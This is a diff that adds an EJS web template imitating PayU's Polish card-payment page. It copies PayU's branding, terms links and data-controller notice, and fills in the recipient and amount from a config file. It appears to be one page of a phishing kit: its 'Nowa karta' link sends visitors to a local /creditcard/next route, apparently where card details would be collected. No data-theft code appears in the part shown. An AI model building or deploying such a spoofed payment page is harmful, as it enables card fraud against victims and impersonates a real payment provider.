@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<%- include("components/head") %>
+
+<body cz-shortcut-listen="true">
+<div id="app">
+    <div class="app default_1tgqtji-o_O-desktop_171s9mi-o_O-tablet_qn423t-o_O-phone_nbhu1w">
+        <div class="logo-lang-container">
+            <section>
+                <div class="logo"><svg><use xlink:href="#logo-payu"></use></svg></div>
+                <div class="language-switcher inline">
+                    <ul class="unstyled">
+                        <li><a class="active" title="Polski" tabindex="1001">Polski</a></li>
+                    </ul>
+                </div>
+            </section>
+        </div>
+        <div>
+            <main>
+                <div class="column column-1">
+                    <aside>
+                        <div>
+                            <div><em class="row"><span>Odbiorca</span></em>
+                                <div class="order-data"><%= config["receiver"] %></div><br>
+                                <hr>
+                            </div>
+                            <div>
+                                <div><em class="row"><div><span>Do zapłaty</span></div><div><%= config["price"] %> zł</div></em></div>
+                            </div>
+                        </div>
+                    </aside>
+                </div>
+                <div class="column column-2">
+                    <article class="hub common">
+                        <header class="row">
+                            <h1><span style="font-family: 'Open Sans'">Karta</span></h1>
+                        </header>
+                        <div class="main">
+                            <a class="block buttonlike inline " tabindex="110" title="Nowa karta" href="/creditcard/next">
+                                <div><svg><use xlink:href="#card-visa-mc"></use></svg></div>
+                                <div>
+                                    <h4>Nowa karta</h4><span>debetowa lub kredytowa</span></div>
+                            </a>
+                            <div class="line-break or-view"><span>LUB</span></div>
+                            <div class="buttonlike action-button secondary" tabindex="500" title="Karta kredytowa lub debetowa" onclick="window.location.href = '/'"><span>Wybierz inną metodę płatności</span></div>
+                        </div>
+                        <footer class="row">
+                            <div class="tooltip-icon"><i class="sprite tooltip-information-mark"></i></div>
+                            <div><span>Płacąc akceptujesz <a href="https://static.payu.com/sites/terms/files/payu_terms_of_service_single_transaction_pl_pl.pdf" target="_blank">Zasady płatności PayU</a>.</span></div>
+                            <ul class="unstyled">
+                                <li class="sprite pcidss"></li>
+                            </ul>
+                        </footer>
+                    </article>
+                </div>
+            </main>
+        </div>
+        <div class="regulations-container">
+            <section>
+                <section>
+                    <div class="regulations"><span><span><strong>Zlecenie PayU S.A. realizacji płatności</strong></span>&nbsp;</span></div>
+                    <p
+                            class="regulations"><span><span><strong>Administratorem Twoich danych osobowych</strong> jest PayU S.A. z siedzibą w Poznaniu (60-166), przy ul. Grunwaldzkiej 186 („PayU”). Twoje dane osobowe będą przetwarzane w celu realizacji transakcji płatniczej, powiadamiania Cię o statusie realizacji Twojej płatności, rozpatrywania reklamacji, a także w celu wypełnienia obowiązków prawnych ciążących na PayU.</span>&nbsp;</span>
+                    </p>
+                </section>
+                <p class="regulations"><span><strong>Strona korzysta z plików cookies</strong> w celu realizacji usług i zgodnie z <a href="https://static.payu.com/sites/terms/files/Polityka_plikow_cookies.pdf" target="_blank">Polityką Plików Cookies</a>. Możesz określić warunki przechowywania lub dostępu do plików cookies w Twojej przeglądarce.</span></p>
+            </section>
+        </div>
+    </div>
+</div>
+<%- include("components/svg") %>
+
+</body>
+
+</html>
